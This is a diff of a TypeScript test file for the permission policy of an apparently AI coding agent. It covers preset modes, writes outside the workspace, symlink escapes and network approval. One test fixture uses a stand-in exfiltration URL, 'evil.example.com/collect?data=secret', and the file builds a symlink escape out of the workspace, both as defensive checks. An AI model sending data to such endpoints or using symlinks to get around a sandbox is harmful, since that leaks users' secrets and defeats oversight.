@@ -1,6 +1,8 @@
+import { mkdtempSync, rmSync, symlinkSync } from 'node:fs'
+import { tmpdir } from 'node:os'
 import { describe, expect, it } from 'vitest'
 import { normalizePath } from '@lcode/fs'
-import { resolve } from 'node:path'
+import { join, resolve } from 'node:path'
 import { PERMISSION_PRESETS, PRESET_KNOBS, knobsOf } from './permission-presets.ts'
 import { evaluate } from './policy.ts'
 import type { ActionIntent, PolicyContext } from './policy.ts'
@@ -18,7 +20,7 @@ import type { ActionIntent, PolicyContext } from './policy.ts'
 const ROOT = '/repo/web'
 /** 与实现同口径地算出绝对路径（Windows 上 `resolve` 会补盘符，断言不能写死字面量） */
 const abs = (p: string): string => normalizePath(resolve(normalizePath(resolve(ROOT)), p))
-const base: PolicyContext = { preset: '标准', workspaceRoot: ROOT }
+const base: PolicyContext = { preset: '工作区内修改', workspaceRoot: ROOT }
 
 /** 一次工作区内的普通写 */
 const insideWrite: ActionIntent = {
@@ -35,13 +37,11 @@ const outsideWrite: ActionIntent = {
 }
 
 describe('预设 → 两条轴（12 §3.3 表格逐格对应）', () => {
-  it('五档的取值与文档表格一致', () => {
+  it('三档的取值与文档表格一致', () => {
     expect(PRESET_KNOBS).toEqual({
       只读: { sandboxMode: 'read-only', approvalPolicy: 'ask' },
-      标准: { sandboxMode: 'workspace-write', approvalPolicy: 'ask' },
-      自动: { sandboxMode: 'workspace-write', approvalPolicy: 'never' },
+      工作区内修改: { sandboxMode: 'workspace-write', approvalPolicy: 'ask' },
       完全访问: { sandboxMode: 'danger-full-access', approvalPolicy: 'ask' },
-      无人值守: { sandboxMode: 'workspace-write', approvalPolicy: 'never' },
     })
   })
 
@@ -76,7 +76,7 @@ describe('工作区外写：一定问（12 §9.3 ①）', () => {
     // ⚠️ UI 靠这个字段显著标出"在工作区外"（T1 的最后防线）
     expect(v.impact.paths?.[0]).toMatchObject({ path: abs('/repo/other/.env'), outsideWorkspace: true })
     expect(v.basis.source).toBe('preset')
-    expect(v.basis.presetName).toBe('标准')
+    expect(v.basis.presetName).toBe('工作区内修改')
   })
 
   it('**前缀相同但不是子路径** 也要问（`/repo/web-evil`）', () => {
@@ -93,18 +93,6 @@ describe('工作区外写：一定问（12 §9.3 ①）', () => {
     expect(v).toEqual({ kind: 'allow' })
   })
 
-  it('`自动` 档 → **拒绝**（never 不等于放行）', () => {
-    const v = evaluate(outsideWrite, { ...base, preset: '自动' })
-    expect(v.kind).toBe('deny')
-    if (v.kind !== 'deny') throw new Error('unreachable')
-    expect(v.code).toBe('EP-DENIED_BY_GUARD')
-    // 理由要说清"为什么没人问就拒了"，否则用户以为是 bug
-    expect(v.reason).toContain('不询问')
-  })
-
-  it('`无人值守` 档 → 同样是拒绝（不是放行）', () => {
-    expect(evaluate(outsideWrite, { ...base, preset: '无人值守' }).kind).toBe('deny')
-  })
 
   it('`完全访问` 档 → 仍然问（danger-full-access + ask）', () => {
     // 「完全访问」放宽的是**沙箱可达范围**，不是"不用问"
@@ -191,6 +179,19 @@ describe('网络：未出现过的域名要问（12 §9.3 ②）', () => {
     if (v.kind !== 'ask') throw new Error('unreachable')
     expect(v.impact.network?.domains).toEqual(['evil.example.com'])
   })
+
+  it('web 工具还带上完整 URL，路径与查询不能被域名遮住', () => {
+    const v = evaluate(
+      { tool: 'web_fetch', summary: '拉取', domains: ['evil.example.com'], url: 'https://evil.example.com/collect?data=secret' },
+      { ...base, seenDomains: new Set() },
+    )
+    expect(v.kind).toBe('ask')
+    if (v.kind !== 'ask') throw new Error('unreachable')
+    expect(v.impact.network).toEqual({
+      domains: ['evil.example.com'],
+      url: 'https://evil.example.com/collect?data=secret',
+    })
+  })
 })
 
 describe('放宽沙箱档位要问（12 §9.3 ⑤）', () => {
@@ -254,5 +255,59 @@ describe('Impact 只带名字不带值（I7）', () => {
     // 类型上就是 `string[]`（名字），值根本没有进入这个数据的通道——
     // 这是 I7 在**类型层面**的落实，而不是靠"记得别填值"
     expect(v.impact.env).toEqual(['OPENAI_API_KEY'])
+  })
+})
+
+describe('真实路径：符号链接不能伪装成工作区内路径', () => {
+  it('工作区内指向外部的目录链接，写到链接下按“工作区外”处理', () => {
+    const workspace = mkdtempSync(join(tmpdir(), 'lcode-policy-ws-'))
+    const outside = mkdtempSync(join(tmpdir(), 'lcode-policy-out-'))
+    try {
+      const link = join(workspace, 'escape')
+      symlinkSync(outside, link, process.platform === 'win32' ? 'junction' : 'dir')
+      const v = evaluate(
+        { tool: 'write', summary: '写链接目标', paths: [{ path: join(link, 'secret.txt'), mode: 'write' }] },
+        { preset: '工作区内修改', workspaceRoot: workspace },
+      )
+      expect(v.kind).toBe('ask')
+      if (v.kind !== 'ask') throw new Error('unreachable')
+      expect(v.impact.paths?.[0]?.outsideWorkspace).toBe(true)
+    } finally {
+      rmSync(workspace, { recursive: true, force: true })
+      rmSync(outside, { recursive: true, force: true })
+    }
+  })
+})
+
+describe('shell 显式联网', () => {
+  it('工作区内修改档 → 询问并显著标出任意域名', () => {
+    const v = evaluate(
+      { tool: 'shell', summary: '需要联网', argv: ['curl', 'https://example.com'], network: true },
+      base,
+    )
+    expect(v.kind).toBe('ask')
+    if (v.kind !== 'ask') throw new Error('unreachable')
+    expect(v.basis.reason).toContain('访问网络')
+    expect(v.impact.network?.domains).toEqual(['*'])
+  })
+
+  it('终端联网授权带 scope=terminal，审批文案能区分生命周期', () => {
+    const v = evaluate(
+      { tool: 'terminal', summary: '打开联网终端', argv: ['terminal', 'open'], network: true, networkScope: 'terminal' },
+      base,
+    )
+    expect(v.kind).toBe('ask')
+    if (v.kind !== 'ask') throw new Error('unreachable')
+    expect(v.impact.network).toEqual({ domains: ['*'], scope: 'terminal' })
+  })
+
+  it('只读档 → 直接拒绝（不能借联网把数据发出去）', () => {
+    const v = evaluate(
+      { tool: 'shell', summary: '需要联网', argv: ['curl', 'https://example.com'], network: true },
+      { ...base, preset: '只读' },
+    )
+    expect(v.kind).toBe('deny')
+    if (v.kind !== 'deny') throw new Error('unreachable')
+    expect(v.reason).toContain('只读')
   })
 })
